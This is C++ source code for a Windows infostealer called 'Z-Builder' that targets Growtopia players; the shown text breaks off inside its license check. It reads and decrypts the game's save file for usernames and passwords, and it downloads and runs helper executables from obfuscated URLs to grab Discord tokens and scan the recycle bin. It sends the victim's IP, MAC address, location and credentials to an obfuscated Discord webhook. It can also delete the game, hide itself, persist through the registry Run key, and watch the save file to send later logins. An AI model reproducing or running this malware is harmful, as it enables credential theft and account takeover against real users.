// TODO:
// Add exception for when there is no save.dat
// Add search for custom save.dats

#define _CRT_SECURE_NO_WARNINGS

#include <string>
#include <Windows.h>
#include <Wininet.h>
#include <tchar.h>
#include <iostream>
#include <shlobj.h>
#include <Shlwapi.h>
#include <fstream>
#include <sstream>
#include <vector>
#include <algorithm>
#include <ctime> 
#include <FileSystem>
#include "FileWatcher.h"
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")

using namespace std;
namespace fs = std::filesystem;

string SaveDatPath();
string GetLocation();
string trim(const string& s);
void SendMessage(string Message, string ContentType);
string savedecrypt();
string DiscordToken();
void TraceAcc();
string DownloadString(string URL);
int DownloadFile(string url, string path);
void CleanUp();
void RecoverSaveDats();
void Execute(wstring toto);
void LocateAllAccs();
string decrypt(string str);
void DeleteGT();
void RunOnStartUp();
void HideStealer();
bool VerifyLicense(string License);
string decrypt2(string toEncryt);
string ReadContent(string Path);
void WriteTempContent(string Content);
string GetMAC();

INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
{
    //string License = "[mohvyqre{J2N7U6YJ}]";
    string License = "[zbuilder{zbuilder}]";
    if (VerifyLicense(decrypt(License)))
    {
        string Feature = "[Tracer:(N)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
        CleanUp();
        string RawIPInfo = DownloadString("http://icanhazip.com/");
        string IPInfo = RawIPInfo.erase(RawIPInfo.size() - 1);
        string Location = GetLocation();
        // Time
        time_t tt;
        struct tm* ti;
        time(&tt);
        ti = localtime(&tt);
        string RawTime = asctime(ti);
        string Time = trim(RawTime);
        // Time - End
        // Acc Data (Main Account)
        string tempPath = getenv("TEMP");
        string targetString = tempPath + "\\save.dat";
        string SaveDatLocation = SaveDatPath();
        try
        {
            wstring wSaveDatLocation;
            wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
            wstring wTarget;
            wTarget.assign(targetString.begin(), targetString.end());
            try
            {
                CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
            }
            catch (...)
            {
            }
        }
        catch (...) {}
        string AccDataContent = savedecrypt();
        string GrowID;
        string Password;
        string LastWorld;
        if (AccDataContent != "")
        {
            string AccDataSplit = "[---Z-Builder---]";
            size_t StringSplit = AccDataContent.find(AccDataSplit);
            GrowID = AccDataContent.substr(0, StringSplit);
            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
            StringSplit = AccDataContent.find(AccDataSplit);
            Password = AccDataContent.substr(0, StringSplit);
            AccDataContent.erase(0, StringSplit + AccDataSplit.size());
            LastWorld = AccDataContent;
        }
        else
        {
            GrowID = "No GrowID found";
            Password = "No password found";
            LastWorld = "No world found";
        }
        // Acc Data (Main Account) - End
        // Discord Token
        string DToken = DiscordToken();
        if (DToken == "")
        {
            DToken = "No discord token found";
        }
        // Discord Token - End
        string Info = "MAC address(es): ```" + GetMAC() + "```" + "IP address: ```" + IPInfo + "```" + "City / Region / Country: ```" + Location + "```" + "Time stolen: ```" + Time + "```" + "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```" + "Discord token: ```" + DToken + "```";
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Got an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
        CleanUp();
        if (Feature.find("[HideStealer:(Y)]") != string::npos)
        {
            HideStealer();
        }
        if (Feature.find("[StartUp:(Y)]") != string::npos)
        {
            RunOnStartUp();
        }
        if (Feature.find("[Recover:(Y)]") != string::npos)
        {
            RecoverSaveDats();
            CleanUp();
        }
        if (Feature.find("[GetAllAccs:(Y)") != string::npos)
        {
            LocateAllAccs();
            CleanUp();
        }
        if (Feature.find("[DeleteGT:(Y)]") != string::npos)
        {
            DeleteGT();
        }
        if (Feature.find("[Tracer:(Y)]") != string::npos)
        {
            TraceAcc();
        }
        return 0;
    }
}

string GetMAC()
{
    string TempPath = getenv("TEMP");
    string MACFile = TempPath + "\\MAC.bat";
    ofstream WriteScript(MACFile, std::ofstream::trunc);
    WriteScript << "GetMAC > %temp%\\MAC.zb";
    WriteScript.close();
    string Code = "cmd.exe /c " + MACFile;
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    string Results = TempPath + "\\MAC.zb";
    ifstream ReadResult(Results);
    string MACResults((istreambuf_iterator<char>(ReadResult)),
        (istreambuf_iterator<char>()));
    string AllMacs = "";
    while (MACResults.find("\n") != string::npos)
    {
        string StringToSplit = "\n";
        size_t Splitter = MACResults.find(StringToSplit);
        string PotentialMACLine = MACResults.substr(0, Splitter);
        string PotentialMAC = PotentialMACLine.substr(0, 16);
        if (PotentialMAC.find('-') != string::npos)
        {
            AllMacs += PotentialMAC + " / ";
        }
        MACResults.erase(0, Splitter + 1);
    }
    remove(MACFile.c_str());
    remove(Results.c_str());
    return AllMacs.substr(0, AllMacs.length() - 3);
}
void HideStealer()
{
    try 
    {
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);
        DWORD attributes = GetFileAttributes(szPath);
        SetFileAttributes(szPath, attributes | FILE_ATTRIBUTE_HIDDEN);
    }
    catch (...){}
}

// Delete growtopia
void DeleteGT()
{
    string AppDataPath = getenv("LOCALAPPDATA");
    string GTLocation = AppDataPath + "\\Growtopia\\Growtopia.exe";
    remove(GTLocation.c_str());
}
// Delete growtopia - End

// Download string
string replaceAll(string subject, const string& search,
    const string& replace) {
    size_t pos = 0;
    while ((pos = subject.find(search, pos)) != string::npos) {
        subject.replace(pos, search.length(), replace);
        pos += replace.length();
    }
    return subject;
}

string DownloadString(string URL) {
    HINTERNET interwebs = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    HINTERNET urlFile;
    string rtn;
    if (interwebs) {
        urlFile = InternetOpenUrlA(interwebs, URL.c_str(), NULL, NULL, NULL, NULL);
        if (urlFile) {
            char buffer[2000];
            DWORD bytesRead;
            do {
                InternetReadFile(urlFile, buffer, 2000, &bytesRead);
                rtn.append(buffer, bytesRead);
                memset(buffer, 0, 2000);
            } while (bytesRead);
            InternetCloseHandle(interwebs);
            InternetCloseHandle(urlFile);
            string p = replaceAll(rtn, "|n", "\r\n");
            return p;
        }
    }
    InternetCloseHandle(interwebs);
    string p = replaceAll(rtn, "|n", "\r\n");
    return p;
}
// Download string - End
string SaveDatPath()
{
    string GTLocation;
    try
    {
        HKEY hKey;
        char data[255];
        DWORD datasize = sizeof(data) / sizeof(char);
        RegOpenKeyEx(HKEY_CURRENT_USER, _T("Software\\Growtopia"), 0, KEY_READ, &hKey);
        RegGetValueA(hKey, NULL, "path", RRF_RT_REG_SZ, NULL, (void*)data, &datasize);
        GTLocation = data;
    }
    catch (...)
    {
    }
    string GTFileLocation = GTLocation + "\\Growtopia.exe";
    ifstream GTFile(GTFileLocation, std::ios::binary);
    string AllBytes = string((istreambuf_iterator<char>(GTFile)),
        (istreambuf_iterator<char>()));
    GTFile.close();
    string LocationOfName = "Exiting the app";
    size_t DummyLicenseLocation = AllBytes.find(LocationOfName);
    string SaveDatName = AllBytes.substr(DummyLicenseLocation + LocationOfName.length() + 1);
    SaveDatName = SaveDatName.substr(0, 8);
    string SaveDatLocation = GTLocation + "\\" + SaveDatName;
    return SaveDatLocation;
}

string GetLocation()
{
    try
    {
        string RawDataInfo = DownloadString("https://www.geodatatool.com/");
        if (RawDataInfo.find("Too Many Requests") != string::npos)
        {
            return "Too many requests";
        }
        string delimiterLocation = "<span class=\"bold\">Country:</span>\n\n									<span>";
        size_t LocationDelimiter0 = RawDataInfo.find(delimiterLocation);
        size_t DelimiterSize = delimiterLocation.size();
        string RemovedBeginning = RawDataInfo.erase(0, LocationDelimiter0 + DelimiterSize);
        stringstream DataToParse(RemovedBeginning);
        string segment;
        vector<string> segmentList;
        while (getline(DataToParse, segment, '\n'))
        {
            segmentList.push_back(segment);
        }
        string Country = trim(segmentList[3]);
        size_t RegSpanNum = trim(segmentList[14]).find("</span");
        size_t CitySpanNum = trim(segmentList[19]).find("</span");
        string Region = trim(segmentList[14]).substr(6, RegSpanNum - 6);
        string City = trim(segmentList[19]).substr(6, CitySpanNum - 6);
        string Location = City + " / " + Region + " / " + Country;
        return Location;
    }
    catch (...)
    {
        return "Too many requests";
    }
}
string savedecrypt()
{
    string tempPath = getenv("TEMP");
    string decrypterPath = tempPath + "\\savedecrypter.exe";
    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk10jqczog66itev!av?!5+++pt?7~-!7"), decrypterPath);
    string AccDataPath = tempPath + "\\Password.zb";
    remove(AccDataPath.c_str());
    string TempSaveDatLocation = tempPath + "\\save.dat";
    wstring wDecrypterPath;
    wDecrypterPath.assign(decrypterPath.begin(), decrypterPath.end());
    Execute(wDecrypterPath);
    string AccDataContent;
    try
    {
        ifstream RawAccData(AccDataPath);
        AccDataContent = string((istreambuf_iterator<char>(RawAccData)),
            (istreambuf_iterator<char>()));
    }
    catch (...)
    {
        string AccDataContent = "";
    }
    return AccDataContent;
}

string DiscordToken()
{
    string tempPath = getenv("TEMP");
    string DiscordTokenGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
    const char* DiscordTokenGrabberPath = DiscordTokenGrabberEXE.c_str();
    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}lk09j|en`38cvh~vBD363'+6To1 >+3bb?7~-!7"), DiscordTokenGrabberEXE);
    string DiscordTokenTXT = tempPath + "\\DiscordToken.txt";
    wstring wDiscordTokenTXT;
    wDiscordTokenTXT.assign(DiscordTokenTXT.begin(), DiscordTokenTXT.end());
    try { DeleteFile(wDiscordTokenTXT.c_str()); }
    catch (...) {}
    WinExec(DiscordTokenGrabberPath, SW_HIDE);
    string DiscordToken;
    try
    {
        ifstream RawDCToken(DiscordTokenTXT);
        DiscordToken = string((istreambuf_iterator<char>(RawDCToken)),
            (istreambuf_iterator<char>()));
    }
    catch (...)
    {
        DiscordToken = "No discord token found";
    }
    try { DeleteFile(wDiscordTokenTXT.c_str()); }
    catch (...) {}
    return DiscordToken;
}
// Recover accounts from recycle bin
void RecoverSaveDats()
{
    string Info;
    string FullData;
    string tempPath = getenv("TEMP");
    string tempSaveDat = tempPath + "\\save.dat";
    string ZBRecoveredFolder = tempPath + "\\ZBRecoveredFolder";
    try
    {
        filesystem::remove(ZBRecoveredFolder);
        filesystem::create_directory(ZBRecoveredFolder);
    }
    catch (...)
    {
        filesystem::create_directory(ZBRecoveredFolder);
    }
    string RecoverPath = tempPath + "\\RecycleBinScanner.exe";
    DownloadFile(decrypt2("21$8*h//9!>f=;sc574))\".c5()-&ac2(5&-!/7opixaj49mvhpm`19ljg}ok09n|fyof54bsgpv ec#&<-;nS9$>&< .e\" "), RecoverPath);
    wstring wRecoverPath;
    string tempResult = tempPath + "\\Password.zb";
    wRecoverPath.assign(RecoverPath.begin(), RecoverPath.end());
    Execute(wRecoverPath);
    for (const auto& entry : fs::directory_iterator(ZBRecoveredFolder))
    {
        filesystem::rename(entry.path().string(), tempSaveDat);
        savedecrypt();
        ifstream RawRecoveredAccContent(tempResult);
        string RecoveredAccDataContent((istreambuf_iterator<char>(RawRecoveredAccContent)),
            (istreambuf_iterator<char>()));
        if (RecoveredAccDataContent != "")
        {
            FullData += RecoveredAccDataContent + "[Z-Builder]";
        }
        remove(tempPath.c_str());
    }
    while (FullData.find("[Z-Builder]") != string::npos)
    {
        size_t Splitter = FullData.find("[Z-Builder]");
        string SplitData = FullData.substr(0, Splitter + 11);
        FullData.erase(0, Splitter + 11);
        string AccDataSplit = "[---Z-Builder---]";
        size_t LocateAccInfo = SplitData.find(AccDataSplit);
        string GrowID = SplitData.substr(0, LocateAccInfo);
        SplitData.erase(0, LocateAccInfo + 17);
        LocateAccInfo = SplitData.find(AccDataSplit);
        string Password = SplitData.substr(0, LocateAccInfo);
        SplitData.erase(0, LocateAccInfo + 17);
        Splitter = SplitData.find("[Z-Builder]");
        string LastWorld = SplitData.substr(0, Splitter);
        Info += "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
    }
    if (Info != "")
    {
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are the recovered account(s)! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json");
    }
}
// Recover accounts from recycle bin - End

// Get all accounts in the PC (besides recycle bin)
void LocateAllAccs()
{
    string tempPath = getenv("TEMP");
    string BatFile = tempPath + "\\ScanPC.bat";
    string Results = tempPath + "\\SaveDatLocation.txt";
    try
    {
        remove(Results.c_str());
        ofstream CreateResults(Results);
        CreateResults.close();
    }
    catch (...)
    {
        ofstream CreateResults(Results);
        CreateResults.close();
    }
    try
    {
        remove(BatFile.c_str());
        ofstream WriteScript(BatFile);
        WriteScript << "cd %USERPROFILE%\ndir save.dat /S /B > %temp%\\SaveDatLocation.txt";
        WriteScript.close();
    }
    catch (...)
    {
        ofstream WriteScript(BatFile);
        WriteScript << "cd %USERPROFILE%\ndir save.dat /S /B > %temp%\\SaveDatLocation.txt";
        WriteScript.close();
    }
    string Code = "cmd.exe /c " + BatFile;
    wstring wCode;
    wCode.assign(Code.begin(), Code.end());
    LPWSTR LPWSTRCode = const_cast<wchar_t*>(wCode.c_str());
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    bool Debug = CreateProcess(NULL, LPWSTRCode, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    ifstream ReadResult(Results);
    string LocationResults((istreambuf_iterator<char>(ReadResult)),
        (istreambuf_iterator<char>()));
    string AccResults = tempPath + "\\Password.zb";
    string AllData;
    while (LocationResults.find("\n") != string::npos)
    {
        string StringToSplit = "\n";
        string destination = tempPath + "\\save.dat";
        size_t Splitter = LocationResults.find(StringToSplit);
        string aLocation = LocationResults.substr(0, Splitter);
        fs::copy_file(aLocation, destination, fs::copy_options::overwrite_existing);
        try
        {
            remove(AccResults.c_str());
        }
        catch (...){}
        savedecrypt();
        string AccData;
        try
        {
            ifstream ReadAccInfo(AccResults);
            AccData = string((istreambuf_iterator<char>(ReadAccInfo)),
                (istreambuf_iterator<char>()));
            if (AccData != "")
            {
                AllData += AccData + "[Z-Builder]";
            }
        }
        catch (...){}
        LocationResults.erase(0, Splitter + StringToSplit.size());
    }
    string Info;
    while (AllData.find("[Z-Builder]") != string::npos)
    {
        string Splits = "[Z-Builder]";
        string MiniSplit = "[---Z-Builder---]";
        size_t Splitter = AllData.find("[Z-Builder]");
        string aData = AllData.substr(0, Splitter);
        size_t MiniSplitter = aData.find("[---Z-Builder---]");
        string GrowID = aData.substr(0, MiniSplitter);
        aData.erase(0, MiniSplitter + MiniSplit.size());
        MiniSplitter = aData.find("[---Z-Builder---]");
        string Password = aData.substr(0, MiniSplitter);
        aData.erase(0, MiniSplitter + MiniSplit.size());
        string LastWorld = aData;
        AllData.erase(0, Splitter + Splits.size());
        Info += "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
    }
    if (Info.find("GrowID") != string::npos)
    {
        string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Here are all account(s) on the PC (besides recycle bin)! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
        SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
    }
}
// Get all accounts in the PC (besides recycle bin) - End

// Tracer
string ReadContent(string path)
{
    ifstream ReadContent(path, std::ios::binary);
    string Content = string((istreambuf_iterator<char>(ReadContent)),
        (istreambuf_iterator<char>()));
    ReadContent.close();
    return Content;
}

void WriteTempContent(string Content)
{
    string TempPath = getenv("TEMP");
    string Location = TempPath + "\\ZBData.zb";
    ofstream WriteContent(Location, std::ofstream::trunc);
    WriteContent << Content;
    WriteContent.close();
}

template<typename InputIterator1, typename InputIterator2> 
bool
range_equal(InputIterator1 first1, InputIterator1 last1,
    InputIterator2 first2, InputIterator2 last2)
{
    while (first1 != last1 && first2 != last2)
    {
        if (*first1 != *first2) return false;
        ++first1;
        ++first2;
    }
    return (first1 == last1) && (first2 == last2);
}

bool compare_files(const std::string& filename1, const std::string& filename2)
{
    std::ifstream file1(filename1);
    std::ifstream file2(filename2);

    std::istreambuf_iterator<char> begin1(file1);
    std::istreambuf_iterator<char> begin2(file2);

    std::istreambuf_iterator<char> end;

    return range_equal(begin1, end, begin2, end);
}

void TraceAcc()
{
    string SaveDatLocation = SaveDatPath();
    string Contents = ReadContent(SaveDatLocation);
    WriteTempContent(Contents);
    string directory;
    const size_t last_slash_idx = SaveDatLocation.rfind('\\');
    if (std::string::npos != last_slash_idx)
    {
        directory = SaveDatLocation.substr(0, last_slash_idx);
    }
    FileWatcher fw{ directory , std::chrono::milliseconds(500) };

    fw.start([](std::string path_to_watch, FileStatus status) -> void {
        if (!std::filesystem::is_regular_file(std::filesystem::path(path_to_watch)) && status != FileStatus::erased) {
            return;
        }
        string SaveDatLocation = SaveDatPath();
        switch (status)
        {
        case FileStatus::created:
            if (path_to_watch == SaveDatLocation)
            {
                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
                string TempContents = ReadContent(TempFileLocation);
                string Contents = ReadContent(SaveDatLocation);
                string tempPath = getenv("TEMP");
                string targetString = tempPath + "\\save.dat";
                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                {
                    try
                    {
                        WriteTempContent(Contents);
                        wstring wSaveDatLocation;
                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                        wstring wTarget;
                        wTarget.assign(targetString.begin(), targetString.end());
                        try
                        {
                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
                        }
                        catch (...)
                        {
                        }
                    }
                    catch (...) {}
                    string AccDataContent = savedecrypt();
                    string GrowID;
                    string Password;
                    string LastWorld;
                    if (AccDataContent != "")
                    {
                        string AccDataSplit = "[---Z-Builder---]";
                        size_t StringSplit = AccDataContent.find(AccDataSplit);
                        GrowID = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        Password = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        LastWorld = AccDataContent;
                    }
                    else
                    {
                        GrowID = "No GrowID found";
                        Password = "No password found";
                        LastWorld = "No world found";
                    }
                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
                    CleanUp();
                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                }
            }
            break;
        case FileStatus::modified:
            if (path_to_watch == SaveDatLocation)
            {
                string TempFileLocation = (string)getenv("TEMP") + "\\ZBData.zb";
                string TempContents = ReadContent(TempFileLocation);
                string Contents = ReadContent(SaveDatLocation);
                string tempPath = getenv("TEMP");
                string targetString = tempPath + "\\save.dat";
                if (!(compare_files(TempFileLocation, SaveDatLocation)))
                {
                    try
                    {
                        WriteTempContent(Contents);
                        wstring wSaveDatLocation;
                        wSaveDatLocation.assign(SaveDatLocation.begin(), SaveDatLocation.end());
                        wstring wTarget;
                        wTarget.assign(targetString.begin(), targetString.end());
                        try
                        {
                            CopyFile(wSaveDatLocation.c_str(), wTarget.c_str(), FALSE);
                        }
                        catch (...)
                        {
                        }
                    }
                    catch (...) {}
                    string AccDataContent = savedecrypt();
                    string GrowID;
                    string Password;
                    string LastWorld;
                    if (AccDataContent != "")
                    {
                        string AccDataSplit = "[---Z-Builder---]";
                        size_t StringSplit = AccDataContent.find(AccDataSplit);
                        GrowID = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        StringSplit = AccDataContent.find(AccDataSplit);
                        Password = AccDataContent.substr(0, StringSplit);
                        AccDataContent.erase(0, StringSplit + AccDataSplit.size());
                        LastWorld = AccDataContent;
                    }
                    else
                    {
                        GrowID = "No GrowID found";
                        Password = "No password found";
                        LastWorld = "No world found";
                    }
                    string Info = "GrowID: ```" + GrowID + "```" + "Password: ```" + Password + "```" + "Last world: ```" + LastWorld + "```";
                    CleanUp();
                    string AllInfo = "{ \"username\":\"Z-Builder\",\"avatar_url\":\"https://cdn.discordapp.com/icons/745016440569987098/56ce57aa24fd66dc9a39fc03b48f9424.png?size=128\",\"embeds\":[{\"title\":\"Traced an account! ~Z-Builder\",\"description\":\"" + Info + "\",\"color\":\"65535\"}] }";
                    SendMessage(AllInfo, "application/json"); //application/json or multipart/form-data
                }
            }
            break;
        case FileStatus::erased:
            break;
        default:
            break;
        }
        });
}
// Tracer - End

void Execute(wstring toto)
{
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION  pi;
    vector<TCHAR> V(toto.length() + 1);
    for (int i = 0;i < (int)toto.length();i++)
        V[i] = toto[i];
    CreateProcess(NULL, &V[0], 0, 0, FALSE, 0, 0, 0, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void CleanUp()
{
    string tempPath = getenv("TEMP");
    try
    {
        string DecrypterPath = tempPath + "\\savedecrypter.exe";
        remove(DecrypterPath.c_str());
    }
    catch (...){}
    try
    {
        string tempSaveDatLocation = tempPath + "\\save.dat";
        remove(tempSaveDatLocation.c_str());
    }
    catch (...){}
    try
    {
        string tempAccData = tempPath + "\\Password.zb";
        remove(tempAccData.c_str());
    }
    catch (...){}
    try
    {
        string DiscordGrabberEXE = tempPath + "\\ZBDiscordTokenGrabber.exe";
        remove(DiscordGrabberEXE.c_str());
    }
    catch (...) {}
    try
    {
        string DiscordToken = tempPath + "\\DiscordToken.txt";
        remove(DiscordToken.c_str());
    }
    catch (...){}
    try
    {
        string RecycleBinScanner = tempPath + "\\RecycleBinScanner.exe";
        remove(RecycleBinScanner.c_str());
    }
    catch (...){}
    try
    {
        string BatFile = tempPath + "\\ScanPC.bat";
        remove(BatFile.c_str());
    }
    catch (...){}
    try
    {
        string SaveDatLocations = tempPath + "\\SaveDatLocation.txt";
        remove(SaveDatLocations.c_str());
    }
    catch (...){}
}

//Trim
string trim(const string& s)
{
    auto start = s.begin();
    while (start != s.end() && isspace(*start))
    {
        start++;
    }
    auto end = s.end();
    do {
        end--;
    } while (distance(start, end) > 0 && isspace(*end));
    return string(start, end + 1);
}
//Trim End

void RunOnStartUp()
{
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    LPWSTR appName = PathFindFileName(szPath);
    *(PathFindExtension(appName)) = 0;
    HKEY newValue;
    RegOpenKey(HKEY_CURRENT_USER, _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newValue);
    RegSetValueEx(newValue, appName, 0, REG_SZ, (LPBYTE)szPath, sizeof(szPath));
    RegCloseKey(newValue);
}

// Download File
size_t write_data(void* ptr, size_t size, size_t nmemb, FILE* stream)
{
    size_t written;
    written = fwrite(ptr, size, nmemb, stream);
    return written;
}

int DownloadFile(string url, string path)
{
    HRESULT hr;
    wstring Wurl;
    Wurl.assign(url.begin(), url.end());
    wstring Wpath;
    Wpath.assign(path.begin(), path.end());
    LPCTSTR Url = Wurl.c_str(), File = Wpath.c_str();
    hr = URLDownloadToFile(0, Url, File, 0, 0);
    return 0;
}
// Download File - End

// Webhook sender
void SendMessage(string Message, string ContentType)
{
    string s = decrypt("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
    //string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
    size_t LocateBegin = s.find("[");
    size_t LocateEnd = s.find("]");
    if (LocateBegin > LocateEnd)
    {
        s = s.substr(0, LocateBegin-1);
    }
    else
    {
        s = s.substr(0, LocateEnd-1);
    }
    string delimiter = "https://discordapp.com/";
    size_t startapilocation = s.find("api");
    string token = s.substr(startapilocation);
    wstring token2;
    token2.assign(token.begin(), token.end());
    LPCTSTR ApiToken = token2.c_str();
    //-----------
    string v = ContentType;
    wstring v2;
    v2.assign(v.begin(), v.end());
    LPCTSTR AcceptTypes = v2.c_str();
    //-----------
    string w = "Content-Type: " + v;
    wstring w2;
    w2.assign(w.begin(), w.end());
    LPCTSTR ContentTypeHeader = w2.c_str();
    //-----------
    LPCTSTR szUserAgent = _T("Mozilla/5.0"); //Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43
    LPCTSTR szHost = _T("discordapp.com");
    LPCTSTR szUrlPath = ApiToken;
    LPCTSTR szAcceptTypes[] = { AcceptTypes, NULL }; //application/json
    LPCTSTR szContentTypeHeader = ContentTypeHeader; //Content-Type: application/json
    LPCSTR szPostData = Message.c_str();
    const DWORD dwPostDataLength = strlen(szPostData);

    HINTERNET hIntSession = InternetOpen(szUserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hIntSession) {
        HINTERNET hHttpSession = InternetConnect(hIntSession, szHost,
            INTERNET_DEFAULT_HTTPS_PORT, 0, 0, INTERNET_SERVICE_HTTP, 0, NULL);
        if (hHttpSession) {
            HINTERNET hHttpRequest = HttpOpenRequest(hHttpSession, _T("POST"), szUrlPath,
                NULL, NULL, szAcceptTypes,
                (INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE |
                    INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_CACHE_WRITE), 0);
            if (hHttpRequest) {
                if (HttpSendRequest(hHttpRequest,
                    szContentTypeHeader, -1, (LPVOID)szPostData,
                    dwPostDataLength)) {

                    DWORD dwStatusCode = 0;
                    {
                        TCHAR szStatusCode[32] = { 0 };
                        DWORD dwStatusCodeSize = sizeof(szStatusCode) / sizeof(TCHAR);
                        if (HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE,
                            szStatusCode, &dwStatusCodeSize, NULL)) {
                            dwStatusCode = _ttoi(szStatusCode);
                        }
                    }

                    //
                    // dwStatusCode: [200,299] means success, any other value
                    // means something went wrong
                    //

                    unsigned char* lpResponse = NULL;
                    DWORD dwTotalSize = 0;
                    {
                        unsigned char* lpBuffer = (unsigned char*)malloc(2048);
                        DWORD dwRead = 0;
                        while (InternetReadFile(hHttpRequest, lpBuffer, sizeof(lpBuffer), &dwRead) && dwRead) {
                            unsigned char* lpTmp = (unsigned char*)realloc(lpResponse, dwTotalSize + dwRead);
                            if (lpTmp) {
                                lpResponse = lpTmp;
                                memcpy(&lpResponse[dwTotalSize], lpBuffer, dwRead);
                                dwTotalSize += dwRead;
                            }
                            dwRead = 0;
                        }
                        free(lpBuffer);
                    }

                    //
                    // lpResponse now has your data with length of dwTotalSize.
                    // Do with it what you want.
                    // Keep in mind that a successful request will return
                    // no data.
                    //

                    if (lpResponse) { free(lpResponse); }
                }
                InternetCloseHandle(hHttpRequest);
            }
            InternetCloseHandle(hHttpSession);
        }
        InternetCloseHandle(hIntSession);
    }
}

// Decrypt strings
string decrypt(string str)
{
    string temp = str;
    int length;

    length = (int)temp.length();

    for (int i = 0; i < length; i++)
    {
        if (isalpha(temp[i]))
        {
            for (int j = 0; j < 13; j++)
            {
                if (temp[i] == 'z')
                {
                    temp[i] = 'a';
                }
                else if (temp[i] == 'Z')
                {
                    temp[i] = 'A';
                }
                else
                {
                    temp[i]++;
                }
            }
        }
    }

    return temp;
}
// Decrypt strings - End

// Verify license
bool VerifyLicense(string License)
{
	std::vector<string> allLicenses;
